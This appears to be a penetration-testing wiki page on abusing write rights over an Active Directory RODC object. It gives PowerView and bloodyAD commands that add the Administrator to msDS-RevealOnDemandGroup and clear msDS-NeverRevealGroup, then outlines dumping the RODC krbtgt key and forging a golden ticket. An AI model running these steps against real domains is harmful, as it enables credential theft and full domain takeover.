With administrative control over the RODC computer object in the Active Directory, there is a path to fully compromise the domain. It is possible to modify the RODC’s `msDS-NeverRevealGroup` and `msDS-RevealOnDemandGroup` attributes to allow a Domain Admin to authenticate and dump his credentials via administrative access over the RODC host.
!!! note
    For more granularity, one of these ACEs against the RODC object is initially sufficient, since they will implicitly allow `WriteProperty` against the `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` attributes:

    - `GenericWrite`
    - `GenericAll / FullControl`
    - `WriteDacl` (the attacker can modify the DACL and obtain arbitrary permissions)
    - `Owns` (c.f. `WriteDacl`)
    - `WriteOwner` (i.e. the attacker can obtain Owns -> WriteDacl -> other permissions)
    - `WriteProperty` against the `msDS-RevealOnDemandGroupattribute` in conjunction with another primitive to gain privileged access to the host. WriteProperty against the `msDS-NeverRevealGroup` attribute may be required if it includes the target account.
=== "UNIX-like"
    From UNIX-like systems, this [PowerView python](https://github.com/aniqfakhrul/powerview.py) package (Python) can be used to modify the LDAP attribute.
    ```bash
    powerview "$DOMAIN"/"$USER":"$PASSWORD"@"RODC_FQDN"
    ```
    ```bash
    #First, add a domain admin account to the msDS-RevealOnDemandGroup attribute
    #Then, append the Allowed RODC Password Replication Group group
    Set-DomainObject -Identity RODC-server$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,DC=domain,DC=local'
    Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local'

    #If needed, remove the admin from the msDS-NeverRevealGroup attribute
    Set-DomainObject -Identity RODC-server$ -Clear msDS-NeverRevealGroup
    ```
    Alternatively, it can be achieved using bloodyAD
    ```bash
    # Get original msDS-RevealOnDemandGroup values 
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object 'RODC-server$' --attr msDS-RevealOnDemandGroup
    distinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local
    msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local

    # Add the previous value plus the admin account
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'

    #If needed, remove the admin from the msDS-NeverRevealGroup attribute
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
    ```
=== "Windows"
    From Windows systems, PowerView (PowerShell) can be used for this purpose.
    ```bash
    #First, add a domain admin account to the msDS-RevealOnDemandGroup attribute
    Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

    #If needed, remove the admin from the msDS-NeverRevealGroup attribute
    Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
    ```
Then, dump the `krbtgt_XXXXX` key on the RODC server with admin access on the host (this can be done by modifying the `managedBy` attribute for example), and use it to forge a `RODC golden ticket` and conduct a key list attack to retrieve the domain Administrator's password hash.